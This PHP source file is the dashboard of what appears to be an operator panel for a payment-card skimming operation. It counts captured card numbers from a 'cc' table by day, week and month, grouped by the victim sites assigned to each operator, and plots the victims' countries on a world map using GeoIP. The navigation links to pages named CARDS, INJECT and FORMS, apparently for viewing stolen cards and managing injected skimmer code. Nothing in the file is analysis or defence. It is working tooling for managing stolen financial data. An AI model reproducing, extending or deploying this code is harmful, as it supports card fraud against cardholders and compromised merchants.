<?php
// dashboard.php
session_start();
require 'includes/config.php'; 
require_once 'vendor/autoload.php';

if (!isset($_SESSION['user_logged_in'])) {
   header('Location: login.php');
   exit();
}

$userRole = $_SESSION['user_role'];
$userId = $_SESSION['user_id'];

function securePrint($value) {
   if ($value === null || $value === '') {
       return '';
   }
   return htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8');
}

function getCardsCount($db, $interval, $userId = null) {
   $query = "SELECT COUNT(DISTINCT payment_cc_number) FROM cc WHERE payment_cc_number IS NOT NULL AND date >= (CURDATE() - INTERVAL $interval)";
   
   if ($userId !== null) {
       $query = "SELECT COUNT(DISTINCT cc.payment_cc_number)
                 FROM cc
                 INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                 WHERE cc.payment_cc_number IS NOT NULL
                   AND cc.date >= (CURDATE() - INTERVAL $interval)
                   AND user_sites.user_id = $userId";
   }
   
   $result = $db->query($query);
   return $result ? $result->fetch_row()[0] : 0;
}

function getTotalCardsCount($db, $userId = null) {
   $query = "SELECT COUNT(*) FROM cc WHERE payment_cc_number IS NOT NULL";
   
   if ($userId !== null) {
       $query = "SELECT COUNT(*)
                 FROM cc
                 INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                 WHERE cc.payment_cc_number IS NOT NULL
                   AND user_sites.user_id = $userId";
   }
   
   $result = $db->query($query);
   return $result ? $result->fetch_row()[0] : 0;
}

if (isset($_GET['date'])) {
   $date = $_GET['date'];
   switch ($date) {
       case 'today':
           $totalCount = $userRole === 'user' ? getTodayCardsCount($db, $userId) : getTodayCardsCount($db);
           break;
       case 'yesterday':
           $totalCount = $userRole === 'user' ? getYesterdayCardsCount($db, $userId) : getYesterdayCardsCount($db);
           break;
       case 'this_week':
           $totalCount = $userRole === 'user' ? getWeeklyCardsCount($db, $userId) : getWeeklyCardsCount($db);
           break;
       case 'this_month':
           $totalCount = $userRole === 'user' ? getMonthlyCardsCount($db, $userId) : getMonthlyCardsCount($db);
           break;
       default:
           $totalCount = $userRole === 'user' ? getTotalCardsCount($db, $userId) : getTotalCardsCount($db);
           break;
   }
} else {
   $totalCount = $userRole === 'user' ? getTotalCardsCount($db, $userId) : getTotalCardsCount($db);
}

function getTodayCardsCount($db, $userId = null) {
   $query = "SELECT COUNT(DISTINCT payment_cc_number) FROM cc WHERE payment_cc_number IS NOT NULL AND date >= CURDATE()";
   
   if ($userId !== null) {
       $query = "SELECT COUNT(DISTINCT cc.payment_cc_number)
                 FROM cc
                 INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                 WHERE cc.payment_cc_number IS NOT NULL
                   AND cc.date >= CURDATE()
                   AND user_sites.user_id = $userId";
   }
   
   $result = $db->query($query);
   return $result ? $result->fetch_row()[0] : 0;
}

function getYesterdayCardsCount($db, $userId = null) {
   $query = "SELECT COUNT(DISTINCT payment_cc_number) FROM cc WHERE payment_cc_number IS NOT NULL AND date >= DATE_SUB(CURDATE(), INTERVAL 1 DAY) AND date < CURDATE()";

   if ($userId !== null) {
       $query = "SELECT COUNT(DISTINCT cc.payment_cc_number)
                 FROM cc
                 INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                 WHERE cc.payment_cc_number IS NOT NULL
                   AND cc.date >= DATE_SUB(CURDATE(), INTERVAL 1 DAY)
                   AND cc.date < CURDATE()
                   AND user_sites.user_id = $userId";
   }

   $result = $db->query($query);
   return $result ? $result->fetch_row()[0] : 0;
}

function getWeeklyCardsCount($db, $userId = null) {
   return getCardsCount($db, '1 WEEK', $userId);
}

function getMonthlyCardsCount($db, $userId = null) {
   return getCardsCount($db, '1 MONTH', $userId);
}

function getUsersByCountry($db, $date, $userId = null) {
   switch ($date) {
       case 'today':
           $interval = 'CURDATE()';
           break;
       case 'yesterday':
           $interval = 'DATE_SUB(CURDATE(), INTERVAL 1 DAY)';
           break;
       case 'this_week':
           $interval = 'CURDATE() - INTERVAL 1 WEEK';
           break;
       case 'this_month':
           $interval = 'CURDATE() - INTERVAL 1 MONTH';
           break;
       default:
           // Для стандартного случая не устанавливаем интервал
           $interval = null;
           break;
   }

   $query = "SELECT ip, COUNT(DISTINCT payment_cc_number) AS count FROM cc WHERE payment_cc_number IS NOT NULL";

   if ($userId !== null) {
       $query = "SELECT cc.ip, COUNT(DISTINCT cc.payment_cc_number) AS count
                 FROM cc
                 INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                 WHERE cc.payment_cc_number IS NOT NULL AND user_sites.user_id = $userId";
   }

   // Добавляем условие выборки по дате, если интервал установлен
   if ($interval !== null) {
       $query .= " AND cc.date >= $interval";
   }

   $query .= " GROUP BY ip";

   $result = $db->query($query);

   $reader = new \GeoIp2\Database\Reader('geoip/GeoLite2-Country.mmdb');

   $data = [];
   $unknownIpAddresses = [];

   while ($result && $row = $result->fetch_assoc()) {
       $ipAddress = $row['ip'];
       $count = $row['count'];

       // Проверка на валидность IP-адреса
       if (!filter_var($ipAddress, FILTER_VALIDATE_IP)) {
           $unknownIpAddresses[] = $ipAddress;
           $data['Unknown'] = ($data['Unknown'] ?? 0) + $count;
           continue;
       }

       try {
           $record = $reader->country($ipAddress);
           $countryName = $record->country->name;

           // Переименовываем "United States" в "United States of America"
           if ($countryName == "United States") {
               $countryName = "United States of America";
           } 
           if ($countryName == "Türkiye") {
               $countryName = "Turkey";
           }
           if ($countryName == "Czechia") {
               $countryName = "Czech Republic";
           }

           $data[$countryName] = ($data[$countryName] ?? 0) + $count;
       } catch (\GeoIp2\Exception\AddressNotFoundException $e) {
           $unknownIpAddresses[] = $ipAddress;
           $data['Unknown'] = ($data['Unknown'] ?? 0) + $count;
       }
   }

   if (!empty($unknownIpAddresses)) {
       $logMessage = "Unknown IP addresses: " . implode(", ", $unknownIpAddresses);
       error_log($logMessage);
   }

   $reader->close();

   return $data;
}

$countryStats = getUsersByCountry($db, $date, $userRole === 'user' ? $userId : null);

if ($userRole === 'user') {
   $todayCount = getTodayCardsCount($db, $userId);
   $yesterdayCount = getYesterdayCardsCount($db, $userId);
   $weeklyCount = getWeeklyCardsCount($db, $userId);
   $monthlyCount = getMonthlyCardsCount($db, $userId);
} else {
   $todayCount = getTodayCardsCount($db);
   $yesterdayCount = getYesterdayCardsCount($db);
   $weeklyCount = getWeeklyCardsCount($db);
   $monthlyCount = getMonthlyCardsCount($db);
}

arsort($countryStats);
?>
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=0.8">
   <title>Dashboard</title>
   <script src="js/chart.js"></script>
   <link href="js/tailwind.min.css" rel="stylesheet">
   <link rel="stylesheet" href="js/jqvmap.min.css">
   <script src="js/d3.min.js"></script>
   <script src="js/topojson.min.js"></script>
   <script src="js/datamaps.all.min.js"></script>
   <style>
       .bg-navy { background-color: #1a1a1a; }
       .border-gold { border-color: #2f2e2c; }
       .text-gold { color: #d4af37; }
       .sidebar-link { white-space: nowrap; }
       #world-map { position: relative; width: 50%; height: 500px; }
       .zoom-buttons { position: absolute; bottom: 10px; right: 10px; z-index: 1000; }
       .zoom-buttons button { display: inline-block; width: 30px; height: 30px; margin-left: 5px; background-color: #1a1a1a; color: #d4af37; border: 1px solid #d4af37; }
   </style>
</head>
<body class="bg-navy text-gold">
   <div class="flex flex-col min-h-screen">
       <nav class="bg-navy border-b-2 px-6 py-4">
           <div class="container mx-auto flex justify-between items-center">
               <div class="flex space-x-4">
                   <a href="dashboard.php" class="text-yellow-500 hover:text-white">DASHBOARD</a>
                   <a href="cards.php?url_id=&country=&date=&records=20&sort=id&order=desc" class="text-yellow-500 hover:text-white">CARDS</a>
                   <a href="inject.php" class="text-yellow-500 hover:text-white">INJECT</a>
                   <a href="tools.php" class="text-yellow-500 hover:text-white">TOOLS</a>
                   <a href="forms.php" class="text-yellow-500 hover:text-white">FORMS</a>
   				<a href="uptime.php" class="text-yellow-500 hover:text-white">UPTIME</a>
               </div>
               <div>
                   <a href="logout.php" class="text-yellow-500 hover:text-white">LOGOUT</a>
               </div>
           </div>
       </nav>
           
       <div class="container mx-auto mt-8">
           <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
<a href="dashboard.php?date=today" class="stat-box bg-gray-800 border border-gold p-4 rounded text-center">Today: <?php echo (int)$todayCount; ?></a>
<a href="dashboard.php?date=yesterday" class="stat-box bg-gray-800 border border-gold p-4 rounded text-center">Yesterday: <?php echo (int)$yesterdayCount; ?></a>
<a href="dashboard.php?date=this_week" class="stat-box bg-gray-800 border border-gold p-4 rounded text-center">This Week: <?php echo (int)$weeklyCount; ?></a>
<a href="dashboard.php?date=this_month" class="stat-box bg-gray-800 border border-gold p-4 rounded text-center">This Month: <?php echo (int)$monthlyCount; ?></a>
           </div>

           <div class="map-container my-8">
               <center><div id="world-map"></div></center>

               <div class="text-center mt-4">
                   <span class="text-xl font-bold">Total Cards: <?php echo (int)$totalCount; ?></span>
               </div>
           </div>

           <div class="mt-8">
               <h2 class="text-2xl font-bold mb-4">Cards by Country</h2>
               <table class="table-auto w-full bg-gray-800">
                   <thead>
                       <tr>
                           <th class="px-4 py-2">Country</th>
                           <th class="px-4 py-2">Cards</th>
                       </tr>
                   </thead>
                   <tbody>
                       <?php foreach ($countryStats as $countryName => $count): ?>
                           <tr>
                               <td class="border px-4 py-2"><?php echo securePrint($countryName); ?></td>
                               <td class="border px-4 py-2"><?php echo (int)$count; ?></td>
                           </tr>
                       <?php endforeach; ?>
                   </tbody>
               </table>
           </div>
       </div>
   </div>

   <script src="js/jquery-3.6.0.min.js"></script>
   <script src="js/jquery.vmap.min.js"></script>
   <script src="js/jquery.vmap.world.js"></script>

<script>
$(document).ready(function() {
   var countryStats = <?php echo json_encode($countryStats, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;

   var colors = ['#FFEDA0', '#FED976', '#FEB24C', '#FD8D3C', '#FC4E2A', '#E31A1C', '#BD0026', '#800026'];
   var maxCount = Math.max(...Object.values(countryStats));

   // Функция для выбора цвета в зависимости от count
   var getColor = function(count) {
       var index = Math.min(colors.length - 1, Math.floor(count / maxCount * colors.length));
       return count > 0 ? colors[index] : '#f4f3f0'; // '#f4f3f0' - цвет по умолчанию
   };

   // Карта
   var map = new Datamap({
       element: document.getElementById('world-map'),
       projection: 'mercator',
       fills: {
           defaultFill: '#f4f3f0'
       },
       data: countryStats,
       geographyConfig: {
           borderColor: '#DEDEDE',
           highlightBorderWidth: 2,
           highlightFillColor: function(geo) {
               return geo['fillColor'] || '#s';
           },
           highlightBorderColor: '#B7B7B7',
           popupTemplate: function(geo, data) {
               var countryName = geo.properties.name;
               var count = countryStats[countryName] || 0;
               return ['<div class="hoverinfo">',
                   '<strong>', countryName, '</strong>',
                   '<br>Cards: ', count,
                   '</div>'].join('');
           }
       },
       done: function(datamap) {
           datamap.svg.selectAll('.datamaps-subunit').style('fill', function(d) {
               var countryName = d.properties.name;
               var count = countryStats[countryName] || 0;
               return getColor(count);
           });
       }
   });

});
</script>
</body>
</html>